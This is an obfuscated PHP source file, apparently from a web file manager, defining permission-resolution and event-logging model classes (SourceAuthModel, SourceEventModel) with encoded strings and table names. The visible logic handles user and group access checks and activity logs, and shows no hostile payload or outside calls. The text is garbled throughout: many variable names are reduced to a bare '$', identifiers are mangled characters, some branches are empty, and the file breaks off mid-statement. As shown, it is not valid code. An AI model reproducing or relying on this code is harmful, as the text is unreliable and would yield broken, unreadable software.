goto F; fݴ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\143\145\137\141\x75\164\x68"; public function getAuth($ڔŧ) { $ =& $_SERVER[ʯ]; $ = $this->sourceAuthSelect($ڔŧ); $҈ = array(); $苀 = array(); $Ơܱ = 2 << 25; foreach ($ as $Ą) { $Ƣ = Model($[548])->listData($Ą[$[2000]]); if (!$Ƣ) { continue; } $҈[] = $Ą; $Ӯ = 0; if ($Ą[$[187]] == SourceModel::TYPE_GROUP) { $Ӯ = $Ơܱ * 2; } if ($Ą[$[187]] == SourceModel::TYPE_USER) { $Ӯ = $Ơܱ; } if ($Ą[$[187]] == SourceModel::TYPE_USER && $Ą[$[546]] == $[221]) { $Ӯ = 0; } $苀[] = $Ƣ[$[463]] + $Ӯ; } array_multisort($苀, SORT_DESC, $҈); return $҈; } public function sourceAuthSelect($텝) { $ء =& $_SERVER[ʯ]; static $ = array(); $Ց = is_array($텝) ? !1 : !0; if ($Ց) { $텝 = array($텝); } $ = array(); foreach ($텝 as $») { if (isset($[$»])) { $[$»] = $[$»]; } } if (count($) == count($텝)) { return $Ց ? $[$텝[0]] : $; } $슋 = $ء[2077]; $ = array($ء[190] => array($ء[7], $텝)); $Æݛ = $this->field($슋)->order($ء[451])->where($)->select(); $ = array_to_keyvalue_group($Æݛ, $ء[190]); foreach ($텝 as $») { $[$»] = $[$»] ? $[$»] : array(); } if ($Ց) { return $Æݛ; } return $; } public function setAuth($Ĺ, $) { $đ끥 =& $_SERVER[ʯ]; $ = Model($đ끥[1393])->sourceInfo($Ĺ); if (!$) { return !1; } if ($[$đ끥[187]] != SourceModel::TYPE_GROUP) { return !1; } $ʮ = 1; $漝 = $[$đ끥[546]]; if ($漝 != $ʮ) { $ج = array($đ끥[1896] => $漝); $ = Model($đ끥[1986])->field($đ끥[1704])->where($ج)->select(); $ = array_to_keyvalue($, $đ끥[12], $đ끥[1704]); } $ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ = array(); foreach ($ as $) { if (!in_array($[$đ끥[187]], $)) { show_json(LNG($đ끥[2078]), !1); } if ($漝 != $ʮ) { if ($[$đ끥[187]] == SourceModel::TYPE_GROUP) { } if ($[$đ끥[546]] != 0 && !in_array($[$đ끥[546]], $)) { } } if ($[$đ끥[546]] == 0) { $[$đ끥[187]] = SourceModel::TYPE_USER; } $[] = array($đ끥[190] => $Ĺ, $đ끥[187] => intval($[$đ끥[187]]), $đ끥[546] => intval($[$đ끥[546]]), $đ끥[2000] => intval($[$đ끥[2000]]) ? intval($[$đ끥[2000]]) : 0, $đ끥[2060] => intval($[$đ끥[2060]]) ? intval($[$đ끥[2060]]) : -1); } $this->where(array($đ끥[467] => $Ĺ))->delete(); $this->addAll($); return !0; } public function authClear($ڏ) { $ =& $_SERVER[ʯ]; $䏢 = Model($[1393])->sourceInfo($ڏ); $ʺ = array($ڏ); if ($䏢[$[461]] == $[98]) { $ʬ = array($[628] => array($[588], $䏢[$[561]] . $ڏ . $[589])); $ʺ = Model($[1393])->field($[467])->where($ʬ)->getField($[190], !0); $ʺ[] = $ڏ; } $this->where(array($[467] => array($[468], $ʺ)))->delete(); return !0; } public function getAllChildren($ŗ) { $Ĭ =& $_SERVER[ʯ]; $܂ = Model($Ĭ[1393])->sourceInfo($ŗ); if ($܂[$Ĭ[461]] != $Ĭ[98]) { return $this->sourceListAuth(array($ŗ)); } if ($܂[$Ĭ[187]] != SourceModel::TYPE_GROUP) { return array(); } $ = 1; $Ѝ둹 = array($ŗ); if ($܂[$Ĭ[189]] == $Ĭ[221] && $܂[$Ĭ[546]] != $) { $Ѝ둹 = $this->groupChidldAllRootSource($܂[$Ĭ[546]]); } $ = $this->field($Ĭ[190])->group($Ĭ[190])->select(); $ = array_to_keyvalue($, $Ĭ[12], $Ĭ[190]); if (!$) { return array(); } $ԋ܍ = $Ĭ[2079]; $ = array($Ĭ[190] => array($Ĭ[7], $), $Ĭ[481] => $Ĭ[221]); $ڋ = Model($Ĭ[885])->field($ԋ܍)->where($)->select(); $ = array($ŗ); foreach ($ڋ as $) { foreach ($Ѝ둹 as $ɥѓ) { $ʽ = $Ĭ[60] . $ɥѓ . $Ĭ[60]; $Ҙ = $[$Ĭ[561]] . $[$Ĭ[190]] . $Ĭ[60]; if (strstr($Ҙ, $ʽ)) { $[] = $[$Ĭ[190]]; break; } } } return $this->sourceListAuth($); } private function sourceListAuth($툧) { $ =& $_SERVER[ʯ]; $ = Model($[1393])->sourceListInfo($툧, !0); $ = $this->sourceAuthSelect($툧); $ڨ = array(); $ס = array(); foreach ($ as $ǌ) { unset($ǌ[$[505]]); unset($ǌ[$[503]]); unset($ǌ[$[463]]); unset($ǌ[$[97]]); $𱀗 = $[$ǌ[$[190]]]; if (!$𱀗) { continue; } $ǌ[$[2080]] = $this->authTargetInfo($𱀗); $ǌ[$[559]] = rtrim($ǌ[$[565]], $[8]) . $[8] . ltrim($ǌ[$[559]], $[8]); $ڨ[] = $ǌ; $ = count(explode($[8], trim($ǌ[$[559]], $[8]))); $ס[] = $ + ($ǌ[$[43]] == $[85] ? 0 : 1000); } array_multisort($ס, SORT_ASC, $ڨ); return $ڨ; } private function groupChidldAllRootSource($Ƞ) { $嬅 =& $_SERVER[ʯ]; $ = Model($嬅[2081])->groupChildrenAll($Ƞ); $ = array($嬅[189] => 0, $嬅[546] => array($嬅[7], $), $嬅[187] => SourceModel::TYPE_GROUP); $ = Model($嬅[885])->field($嬅[190])->where($)->select(); $ = array_to_keyvalue($, $嬅[12], $嬅[190]); return $; } private function authTargetInfo($Ɯ) { $ =& $_SERVER[ʯ]; $ = array(); $ = array(); $ = 2 << 25; foreach ($Ɯ as $Ǡ) { $ = Model($[548])->listData($Ǡ[$[2000]]); if (!$) { continue; } if ($Ǡ[$[187]] == SourceModel::TYPE_USER) { $Ί = Model($[554])->getInfoSimpleOuter($Ǡ[$[546]]); if ($Ί[$[1704]] == $[1249]) { continue; } if ($Ί[$[1704]] == $[221]) { $Ί[$[42]] = LNG($[2082]); } } else { $Ί = Model($[562])->getInfoSimple($Ǡ[$[546]]); } if (!$Ί) { continue; } $Ί[$[516]] = $; $[] = $Ί; $ = 0; if ($Ǡ[$[187]] == SourceModel::TYPE_GROUP) { $ = $ * 2; } if ($Ǡ[$[187]] == SourceModel::TYPE_USER) { $ = $; } if ($Ǡ[$[187]] == SourceModel::TYPE_USER && $Ǡ[$[546]] == $[221]) { $ = 0; } $[] = $[$[463]] + $; } array_multisort($, SORT_DESC, $); return $; } public function getAllChildrenByUser($, $ّ؋) { $Ů =& $_SERVER[ʯ]; $Қ = Model($Ů[575])->getInfo($ّ؋); if (!$ّ؋ || !$ || !$Қ) { return array(); } $Ƶ = Model($Ů[1393])->sourceInfo($); $ = array(); $ = 1; if ($Ƶ[$Ů[189]] == $Ů[221] && $Ƶ[$Ů[546]] != $ && $this->groupContainUser($Ƶ[$Ů[546]], $ّ؋)) { foreach ($Қ[$Ů[2083]] as $) { $ = Model($Ů[562])->getInfo($[$Ů[1896]]); $Ԕ = Model($Ů[575])->getInfoSimpleOuter($ّ؋); $Ԕ[$Ů[516]] = $[$Ů[463]]; if (Model($Ů[548])->authCheckAction($[$Ů[463]][$Ů[463]], $Ů[1917])) { continue; } $ = array($Ů[42] => $Ů[1269] . $[$Ů[42]], $Ů[190] => $[$Ů[97]][$Ů[190]], $Ů[94] => KodIO::make($[$Ů[97]][$Ů[190]]), $Ů[189] => $Ů[221], $Ů[187] => $Ů[555], $Ů[43] => $Ů[592], $Ů[559] => $[$Ů[566]], $Ů[1896] => $[$Ů[1896]], $Ů[563] => $[$Ů[189]], $Ů[2080] => array($Ԕ)); $[$[$Ů[190]]] = $; } } $㨅 = array(); $럔 = $this->getAllChildren($); foreach ($럔 as $ɐܝ) { $ = !1; foreach ($ɐܝ[$Ů[2080]] as $ֆ) { if ($ֆ[$Ů[1704]]) { if ($ֆ[$Ů[1704]] == $ّ؋) { $ = !0; break; } } if ($ֆ[$Ů[1896]]) { if ($this->groupContainUser($ֆ[$Ů[1896]], $ّ؋)) { $ = !0; break; } } } if ($) { $㨅[] = $ɐܝ; } $ߧ = $ɐܝ[$Ů[190]]; if (isset($[$ߧ])) { $ɐܝ[$Ů[2080]][] = $[$ߧ][0]; $[$ߧ] = !1; } } $ = array_filter(array_values($)); $㨅 = array_merge($, $㨅); return $㨅; } public function setAllChildrenByUser($, $笌, $) { $ =& $_SERVER[ʯ]; $ = $this->getAllChildrenByUser($, $笌); if (!$ || !$) { return !1; } foreach ($ as $ˆ) { $ܹӫ = array(); foreach ($ˆ[$[2080]] as $灬ʊ) { $򯹰 = $灬ʊ[$[516]]; $Ӻ = $灬ʊ[$[1704]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $߳գ = $灬ʊ[$[1704]] ? $灬ʊ[$[1704]] : $灬ʊ[$[1896]]; if ($灬ʊ[$[1704]] && $灬ʊ[$[1704]] == $笌) { continue; } $ܹӫ[] = array($[190] => $ˆ[$[190]], $[187] => $Ӻ, $[546] => intval($߳գ), $[2000] => isset($򯹰[$[451]]) ? intval($򯹰[$[451]]) : 0, $[2060] => isset($򯹰[$[2060]]) ? intval($򯹰[$[2060]]) : -1); } $ܹӫ[] = array($[190] => $ˆ[$[190]], $[187] => SourceModel::TYPE_USER, $[546] => intval($笌), $[2000] => intval($), $[2060] => -1); $this->where(array($[467] => $ˆ[$[190]]))->delete(); $this->addAll($ܹӫ); } return !0; } public function get($̓ʄ) { $򲢍 = $this->getSourceList(array($̓ʄ), !0); return $򲢍[0]; } public function getSourceList($Ƒ, $Ā = false, $ϳ = false) { $ۤ =& $_SERVER[ʯ]; if (!$Ƒ) { return array(); } $ = Model($ۤ[1393]); if (!$Ā && count($Ƒ) == 1) { $Ā = array(); $Ā[$Ƒ[0]] = $->sourceInfo($Ƒ[0]); } if (!$Ā) { $ٌ = array($ۤ[467] => array($ۤ[468], $Ƒ)); $Ā = $->field($ۤ[2084])->where($ٌ)->select(); $Ā = array_to_keyvalue($Ā, $ۤ[190]); } $ԑ = $Ƒ; foreach ($Ā as $Ʊ => $낞) { $ = $->parentLevelArray($낞[$ۤ[561]]); $ԑ = array_merge($ԑ, array($Ʊ), array_reverse($)); } $ԑ = array_values(array_unique($ԑ)); if (!$ԑ) { return array(); } $ = $this->sourceAuthSelect($ԑ); $ءˎ = array(); foreach ($ԑ as $) { if (isset($[$])) { $ءˎ[$] = $[$]; } } $ɳ = $this->userIsRoot($ϳ); $˜ = AuthModel::authAll(); $ = array($ۤ[464] => $˜, $ۤ[2085] => array($ۤ[469] => 0, $ۤ[1902] => $˜, $ۤ[470] => LNG($ۤ[2086]), $ۤ[1919] => $ۤ[2087])); $ = array(); foreach ($Ā as $ => $֓) { if ($ɳ && $GLOBALS[$ۤ[6]][$ۤ[1915]]) { $[$] = $; continue; } $[$] = $this->makeSourceAuth($֓, $ءˎ, $ϳ); } return $; } public function authDeepCheck($, $ = false) { $ =& $_SERVER[ʯ]; $ = $ ? $ : USER_ID; $Ȩ = $this->makeAuthDeep($); if (!in_array($, $Ȩ[$[2088]])) { return !1; } $ĉ = array(); foreach ($Ȩ[$[2089]] as $ => $䧵) { if (!in_array($, $䧵)) { continue; } $ĉ[] = $; } if (!$ĉ) { return !1; } $Ś = $ĉ ? $ĉ[0] : $; return array($[464] => -1, $[516] => array($[469] => $[1249], $[1902] => $[221], $[470] => LNG($[2090]), $[1919] => $[2091]), $[2092] => LNG($[2093]), $[2094] => $this->sourceAuthInfo($Ś)); } protected function makeAuthDeep($Ï = false) { $˰ =& $_SERVER[ʯ]; static $ = array(); $Ï = $Ï ? $Ï : USER_ID; if (isset($[$Ï])) { return $[$Ï]; } $ӡܹ = Model($˰[2095])->listData(); $ڰ = array(); foreach ($ӡܹ as $) { if ($[$˰[463]] == 0 && $[$˰[1918]] == $˰[98]) { $ڰ[] = $[$˰[451]]; } } $ = $this->userGroupParents($Ï); $ŋ = array($˰[187] => SourceModel::TYPE_USER, $˰[546] => $Ï); if ($) { $ŋ = array(array($˰[187] => SourceModel::TYPE_USER, $˰[546] => $Ï), array($˰[187] => SourceModel::TYPE_GROUP, $˰[546] => array($˰[468], $)), $˰[1061] => $˰[1994]); } $ = $this->field($˰[2096])->where($ŋ)->select(); $ = array(); $޿ = array_to_keyvalue_group($, $˰[190]); foreach ($޿ as $΄ => $К) { $ۼ = $this->authArrayCheck($К, $Ï); if ($ۼ[$˰[464]] > 0) { $[] = $΄ . $˰[12]; } } if ($) { $Ԛ = Model($˰[562]); foreach ($ as $) { $ = $Ԛ->getInfo($); if (!$ || !is_array($[$˰[97]])) { continue; } $[] = $[$˰[97]][$˰[190]]; } } $Ɂ = array(); $ӛ = $; $ = Model($˰[1393]); $Ԛ = Model($˰[562]); $ׂŭ = array(); $ף = array(); $ʾȸ = array(); $ = array(); if ($) { $ϟՙ = $->where(array($˰[190] => array($˰[468], $)))->select(); foreach ($ϟՙ as $㍥) { $͗ = $->parentLevelArray($㍥[$˰[561]]); $Ɂ = array_merge($Ɂ, $͗); $ӛ[] = $㍥[$˰[546]]; $ׂŭ[$㍥[$˰[190]]] = $͗; $ף[$㍥[$˰[190]]] = $㍥[$˰[546]]; } } $ӛ = array_values(array_unique($ӛ)); $؊ = $ӛ; foreach ($؊ as $) { $ = $Ԛ->getInfo($); $͗ = $->parentLevelArray($[$˰[561]]); $ӛ = array_merge($ӛ, $͗); } $ӛ = array_values(array_unique($ӛ)); foreach ($ӛ as $) { $ = $Ԛ->getInfo($); $Ɂ[] = $[$˰[97]][$˰[190]]; $ʾȸ[$] = $[$˰[97]][$˰[190]]; $[$] = $->parentLevelArray($[$˰[561]]); } foreach ($ׂŭ as $ => $) { $ݹ = $ף[$]; if (!$ݹ || !$ʾȸ[$ݹ]) { continue; } $ = array(); foreach ($[$ݹ] as $) { $[] = $ʾȸ[$]; } $ׂŭ[$] = array_merge($, $); } $Ɂ = array_values(array_unique($Ɂ)); $ = array($˰[2088] => $Ɂ, $˰[2089] => $ׂŭ); $[$Ï] = $; return $; } private function makeSourceAuth($ɕ, $, $ƥ = false) { $ьȨ =& $_SERVER[ʯ]; $ָ = $ьȨ[98]; $콆 = $ɕ[$ьȨ[546]]; $پ = $ɕ[$ьȨ[187]] == SourceModel::TYPE_GROUP; $ = $پ ? $this->groupRootAuth($콆, $ƥ) : !1; if ($ && Model($ьȨ[548])->authCheckAction($[$ьȨ[463]], $ьȨ[1917])) { return $this->groupAuthInfo($, $콆); } $Д = Model($ьȨ[1393])->parentLevelArray($ɕ[$ьȨ[561]]); $Д = array_merge(array($ɕ[$ьȨ[190]]), array_reverse($Д)); $ = !1; foreach ($Д as $) { if (!isset($[$])) { continue; } $ = $this->authMake($[$], $ƥ); if ($[$ьȨ[516]]) { $ = $; break; } } if (!$پ) { return $; } if (!$ && $) { $ = $this->groupAuthInfo($, $콆); } if (!$) { $ = Model($ьȨ[562])->getInfo($콆); $Ր = explode($ьȨ[60], trim($[$ьȨ[561]], $ьȨ[60])); $Ր = array_reverse($Ր); foreach ($Ր as $ٔ) { if ($ٔ == $ьȨ[221] || $ٔ == $ָ) { continue; } $ᐙ = $this->groupRootAuth($ٔ, $ƥ); if (!$ᐙ) { continue; } $ = $this->groupAuthInfo($ᐙ, $ٔ); break; } } if (!$ || $[$ьȨ[464]] <= 0) { $ = $this->authDeepCheck($ɕ[$ьȨ[190]], $ƥ); if ($) { $ = $; } } return $; } private function userIsRoot($ = false) { $ѝݓ =& $_SERVER[ʯ]; if (!$ && _get($GLOBALS, $ѝݓ[544])) { return !0; } $̉ = Model($ѝݓ[575])->getInfo($); $ڼ = Model($ѝݓ[2097])->listData($̉[$ѝݓ[1579]]); if ($ڼ && $ڼ[$ѝݓ[552]][$ѝݓ[2098]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ε) { $ =& $_SERVER[ʯ]; $޷ = Model($[1393]); $ݳ = $޷->sourceInfo($Ε); if (!$ݳ) { return !1; } $޷->groupPathDisplay($ݳ); $ = array($ݳ); $ = $޷->_listAppendPath($); $ݳ = $[0]; $ʑ = $ݳ[$[559]]; if (isset($ݳ[$[567]])) { $ = explode($[8], trim($ݳ[$[559]], $[8])); array_shift($); $ʑ = $ݳ[$[565]] . $[2099] . implode($[8], $); } return array($[470] => $ݳ[$[42]], $[94] => KodIO::make($ݳ[$[190]]), $[2100] => $ʑ); } private function groupAuthInfo($糈, $ٲ) { $ =& $_SERVER[ʯ]; $ = Model($[562])->getInfo($ٲ); return array($[2101] => intval($糈[$[463]]), $[2085] => $糈, $[2102] => LNG($[2103]), $[2094] => array($[470] => $[$[42]], $[94] => KodIO::make($[$[97]][$[190]]), $[2100] => $[$[566]])); } protected function groupRootAuth($, $楋˸ = false) { $ =& $_SERVER[ʯ]; $楋˸ = $楋˸ ? $楋˸ : USER_ID; $ǺƵ = $楋˸ . $[2104] . $; static $ = array(); if (isset($[$ǺƵ])) { return $[$ǺƵ]; } $ = Model($[562])->getInfo($); $ꌦ = $this->userGroupList($楋˸); $뎹 = isset($ꌦ[$]) ? $ꌦ[$][$[463]] : !1; if ($뎹 && Model($[548])->authCheckAction($뎹[$[463]], $[1917])) { $[$ǺƵ] = $뎹; return $뎹; } $ץ̂ = $this->sourceAuthSelect($[$[97]][$[190]]); $̽ = $ץ̂ ? $this->authMake($ץ̂, $楋˸) : !1; $ޫ = $̽ ? $̽[$[516]] : !1; $[$ǺƵ] = $ޫ ? $ޫ : $뎹; return $[$ǺƵ]; } public function authOwnerApply($ѥŰ) { $۝ =& $_SERVER[ʯ]; if (empty($ѥŰ[$۝[463]]) || isset($ѥŰ[$۝[2105]]) && $ѥŰ[$۝[2105]]) { return $ѥŰ; } if (AuthModel::authCheckRoot($ѥŰ[$۝[463]][$۝[464]])) { return $ѥŰ; } $ = Model($۝[1393])->parentLevelArray($ѥŰ[$۝[561]]); $ = array_merge(array($ѥŰ[$۝[190]]), array_reverse($)); $ߢ㷅 = $this->sourceAuthSelect($); $ = array(); $׈ = array(); foreach ($ߢ㷅 as $ޤ => $) { $ = $this->authFolderOwnerUser($); $[$ޤ] = $; $׈ = array_merge($׈, $[$۝[638]]); if ($[$۝[2106]]) { break; } } if (count($׈) == 0) { $׈ = $this->authFolderOwnerGroup($ѥŰ[$۝[546]]); } $׈ = array_unique($׈); if (AuthModel::authCheckRoot($ѥŰ[$۝[463]][$۝[464]])) { $׈[] = USER_ID; } $ѥŰ[$۝[463]][$۝[2107]] = Model($۝[554])->userListInfo($׈); return $ѥŰ; } private function authFolderOwnerGroup($) { $ڽ =& $_SERVER[ʯ]; $Ǡ = Model($ڽ[1986])->where(array($ڽ[1896] => $))->select(); $П = array(); if (!$Ǡ) { return $П; } foreach ($Ǡ as $ؠԇ) { $ = $this->authInfo($ؠԇ); if (AuthModel::authCheckRoot($[$ڽ[463]])) { $П[] = $ؠԇ[$ڽ[1704]]; } } return $П; } private function authFolderOwnerUser($ڮ) { $ =& $_SERVER[ʯ]; $ = array(); $ = !1; foreach ($ڮ as $ʌҴ) { $ړ = $this->authInfo($ʌҴ); if ($ʌҴ[$[546]] == $[221]) { $ = !0; } if ($ʌҴ[$[187]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ړ[$[463]])) { $[] = $ʌҴ[$[546]]; } } } return array($[638] => $, $[2106] => $); } public function authMake($, $ԝ = false) { $؍ג =& $_SERVER[ʯ]; $ߢ = $this->authArrayCheck($, $ԝ); if ($ߢ[$؍ג[2108]]) { $ߢ[$؍ג[2108]] = $this->sourceAuthInfo($ߢ[$؍ג[2108]]); } return $ߢ; } public function authArrayCheck($, $Ǖϓ = false) { $ʼ =& $_SERVER[ʯ]; if (!$) { return array($ʼ[464] => 0, $ʼ[516] => !1); } $Ǖϓ = $Ǖϓ ? $Ǖϓ : USER_ID; $ɢޜ = 0; $ޙ = 0; $˦̤ = 0; $ = 0; $ڬ = 0; $Ʉ = 0; $ٖ = 1000; $ = 0; $Ћ = 0; $Ȼ = 0; $ = 0; $豖 = array($ʼ[190] => 0); foreach ($ as $豖) { $ = $this->authInfo($豖); if (!$) { continue; } $˧ = $豖[$ʼ[546]]; $ = intval($[$ʼ[463]]); if ($豖[$ʼ[187]] == SourceModel::TYPE_USER && $˧ == $Ǖϓ) { $ɢޜ = !0; $˦̤ = $; $ޙ = $; } else { if ($豖[$ʼ[187]] == SourceModel::TYPE_GROUP && $this->groupContainUser($˧, $Ǖϓ)) { $ = !0; $ꢜ = $this->groupStepToUserGroup($˧, $Ǖϓ); if ($ꢜ < $ٖ) { $ٖ = $ꢜ; $ڬ = $; $Ʉ = $; $ = $˧; } if ($ꢜ == $ٖ && $ >= $ڬ) { $ڬ = $; $Ʉ = $; $ = $˧; } } else { if ($˧ == $ʼ[221]) { $Ћ = !0; $ = $; $Ȼ = $; } } } } if ($ɢޜ) { $覉 = $ޙ; $ = $˦̤; $´ = LNG($ʼ[2109]); } else { if ($) { $覉 = $ڬ; $ = $Ʉ; $ = Model($ʼ[562])->getInfo($); $´ = $ʼ[172] . $[$ʼ[566]] . $ʼ[2110] . LNG($ʼ[2111]); } else { if ($Ћ) { $覉 = $Ȼ; $ = $; $´ = LNG($ʼ[2082]); } else { $覉 = 0; $ = !1; $´ = $ʼ[12]; } } } $ = array($ʼ[2101] => intval($覉), $ʼ[2085] => $, $ʼ[2102] => $´, $ʼ[2094] => $豖[$ʼ[190]]); return $; } private function groupContainUser($骿, $ = false) { return in_array($骿, $this->userGroupParents($)); } private function groupStepToUserGroup($Ó, $ǀߢ = false) { $㎸Ս =& $_SERVER[ʯ]; $ò = $this->userGroupList($ǀߢ); $廎 = 1000; $ = $GLOBALS[$㎸Ս[6]][$㎸Ս[99]][$㎸Ս[1999]] == 1; $ = $ ? 3 : 2; foreach ($ò as $ۢ) { if ($ۢ[$㎸Ս[1896]] == $Ó) { return 0; } $Ƹ = explode($㎸Ս[60], trim($ۢ[$㎸Ս[561]], $㎸Ս[60])); if ($Ƹ[0] == $㎸Ս[221] && count($Ƹ) > $) { $ = array_reverse(array_slice($Ƹ, $)); $ՙ鮼 = array_search($Ó, $); if ($ՙ鮼 !== !1 && $ՙ鮼 + 1 <= $廎) { $廎 = $ՙ鮼 + 1; } } } return $廎; } private function userGroupList($ў = false) { $ =& $_SERVER[ʯ]; static $ = array(); if (isset($[$ў])) { return $[$ў]; } $ݐ = Model($[575])->getInfo($ў); $[$ў] = array_to_keyvalue($ݐ[$[2083]], $[1896]); return $[$ў]; } public function userGroupParents($𪂐) { $ǥ =& $_SERVER[ʯ]; static $۳ņ = array(); $𪂐 = $𪂐 ? $𪂐 : USER_ID; if (isset($۳ņ[$𪂐])) { return $۳ņ[$𪂐]; } $򕛌 = $this->userGroupList($𪂐); $Ơ = array(); $ = $GLOBALS[$ǥ[6]][$ǥ[99]][$ǥ[1999]] == 1; $ = $ ? 3 : 2; foreach ($򕛌 as $ش) { $ = array($ش[$ǥ[1896]]); $Ң = explode($ǥ[60], trim($ش[$ǥ[561]], $ǥ[60])); if ($Ң[0] == $ǥ[221] && count($Ң) > $) { $𱨁 = array_slice($Ң, $); $ = array_merge($, array_reverse($𱨁)); } $Ơ = array_merge($Ơ, $); } $۳ņ[$𪂐] = array_unique($Ơ); return $۳ņ[$𪂐]; } public function authTargetInfoMake($μ) { $Ԋ =& $_SERVER[ʯ]; $ = array(); $Ǣߥ = array(); foreach ($μ as $Е) { if ($Е[$Ԋ[187]] == SourceModel::TYPE_USER) { $[] = intval($Е[$Ԋ[546]]); } else { if ($Е[$Ԋ[187]] == SourceModel::TYPE_GROUP) { $Ǣߥ[] = intval($Е[$Ԋ[546]]); } } } if ($) { $ = Model($Ԋ[554])->userListInfo($); } if ($Ǣߥ) { $欫 = array($Ԋ[1984] => array($Ԋ[468], $Ǣߥ)); $Ǣߥ = Model($Ԋ[562])->field($Ԋ[2112])->where($欫)->select(); $Ǣߥ = array_to_keyvalue($Ǣߥ, $Ԋ[1896]); } return array($Ԋ[2113] => $, $Ԋ[2114] => $Ǣߥ); } public function authInfo($) { $ۢ窀 =& $_SERVER[ʯ]; if ($[$ۢ窀[2000]]) { $Ӓ = Model($ۢ窀[548])->listData($[$ۢ窀[2000]]); if (!$Ӓ) { return !1; $җ = Model($ۢ窀[548])->listData(); $ = array_filter_by_field($җ, $ۢ窀[463], $ۢ窀[221]); return $; } $ = array_field_key($Ӓ, array($ۢ窀[451], $ۢ窀[42], $ۢ窀[463], $ۢ窀[1919], $ۢ窀[1920])); $[$ۢ窀[2115]] = $; return $; } else { return array($ۢ窀[469] => 0, $ۢ窀[1902] => $[$ۢ窀[2060]], $ۢ窀[470] => $ۢ窀[12], $ۢ窀[1919] => $ۢ窀[2116]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\143\145\x5f\145\166\x65\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\124\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\164", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\x64\145\163\x63", '', "\151\156\x73\145\162\164\x2c\x75\x70\x64\x61\164\x65\54\x73\x65\x6c\x65\x63\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($񎊇, $, $䫕Ź = '') { $ =& $_SERVER[ʯ]; if (!$this->eventSave) { return; } $ = Model($[1393])->sourceInfo($񎊇); if (!$) { return !1; } if ($this->isCacheEvent($, $)) { return; } if ($䫕Ź && is_string($䫕Ź)) { $䫕Ź = array($[1935] => $䫕Ź); } $ˑ = defined($[2117]) ? USER_ID : 0; $ = array($[467] => $񎊇, $[2118] => $[$[189]], $[2119] => $[$[42]], $[559] => !empty($[$[559]]) ? $[$[559]] : $[12], $[1695] => $ˑ, $[472] => $, $[1697] => $䫕Ź); $this->addSystemLog($, $); unset($[$[2119]], $[$[559]]); return $this->add($); } private function addSystemLog($׎Ш, $񦀎) { $ =& $_SERVER[ʯ]; if ($׎Ш == $[2120]) { $׎Ш = $񦀎[$[502]][$[2121]]; } else { if (in_array($׎Ш, array($[1876], $[2122]))) { $׎Ш = $񦀎[$[502]][$[814]]; } } $ = array_merge($񦀎, array($[2123] => $񦀎[$[190]], $[2124] => $񦀎[$[2124]])); Hook::trigger($[2125], $[2126] . $׎Ш, $񦀎); Model($[1840])->addLog($[2126] . $׎Ш, $); } private function isCacheEvent($, $) { if ($[$_SERVER[ʯ][187]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($֧ݯ, $Ѯ) { $ =& $_SERVER[ʯ]; $ʹԠ = Model($[1393])->sourceInfo($֧ݯ); $ݸ = array($[2121] => $Ѯ, $[42] => $ʹԠ[$[42]]); return $this->addEvent($֧ݯ, $[2120], $ݸ); } public function eventFileEdit($ƺˀ) { $͢ =& $_SERVER[ʯ]; $՚ = array($͢[2127] => $_SERVER[$͢[2128]], $͢[2129] => strtolower(ACTION)); if (isset($GLOBALS[$͢[7]][$͢[2130]])) { $՚[$͢[2130]] = $͢[98]; } return $this->addEvent($ƺˀ, $͢[1866], $՚); } public function eventRecycle($ާ, $) { return $this->addEvent($ާ, $_SERVER[ʯ][2122], $); } public function eventRemove($ɢ) { $ϯ =& $_SERVER[ʯ]; $Č = Model($ϯ[1393])->sourceInfo($ɢ); $ = $Č[$ϯ[42]]; return $this->addEvent($Č[$ϯ[189]], $ϯ[1865], $); } public function eventShare($, $) { return $this->addEvent($, $_SERVER[ʯ][1876], $); } public function eventMove($ǳ, $􎫸, $Շ) { $ᕅ =& $_SERVER[ʯ]; $Ū = Model($ᕅ[1393]); $ݔ = $Ū->sourceInfo($ǳ); $ = $Ū->sourceInfo($􎫸); $ȹ = $Ū->sourceInfo($Շ); $ = array($ᕅ[1221] => $􎫸, $ᕅ[2131] => $[$ᕅ[42]], $ᕅ[2108] => !empty($[$ᕅ[559]]) ? $[$ᕅ[559]] : $ᕅ[12], $ᕅ[1222] => $Շ, $ᕅ[2132] => $ȹ[$ᕅ[42]], $ᕅ[2133] => !empty($ȹ[$ᕅ[559]]) ? $ȹ[$ᕅ[559]] : $ᕅ[12]); $this->addEvent($ǳ, $ᕅ[596], $); $ݔ = $Ū->sourceInfo($ǳ); $ = array($ᕅ[190] => $ݔ[$ᕅ[190]], $ᕅ[42] => $ݔ[$ᕅ[42]]); $this->addEvent($􎫸, $ᕅ[2134], $); } public function eventCopy($̎) { $this->eventCreate($̎, $_SERVER[ʯ][594]); } public function eventRename($, $ڝ, $°) { $ =& $_SERVER[ʯ]; $ = array($[1221] => $ڝ, $[1222] => $°); return $this->addEvent($, $[1407], $); } public function eventAddComment($¤, $ŭ) { return $this->addEvent($¤, $_SERVER[ʯ][2135], $ŭ); } public function eventAddDesc($ͥ, $ʋ) { return $this->addEvent($ͥ, $_SERVER[ʯ][2136], $ʋ); } public function listBySource($) { $Ӆ =& $_SERVER[ʯ]; $ = Model($Ӆ[1393])->sourceInfo($); $ɭ = array($Ӆ[467] => $); if ($[$Ӆ[461]] == $Ӆ[98]) { $ = Model($Ӆ[1393])->listSearchChildren($, 20000); $[] = $ . $Ӆ[430]; $ɭ = array($Ӆ[190] => array($Ӆ[7], $)); } $䞱߇ = $this->where($ɭ)->order($Ӆ[2137])->selectPage(); if ($䞱߇[$Ӆ[418]][$Ӆ[419]] == 0) { $䞱߇[$Ӆ[418]][$Ӆ[419]] = 1; $䞱߇[$Ӆ[421]] = array(array($Ӆ[467] => $, $Ӆ[2118] => $[$Ӆ[189]], $Ӆ[1695] => $[$Ӆ[503]], $Ӆ[472] => $Ӆ[2138], 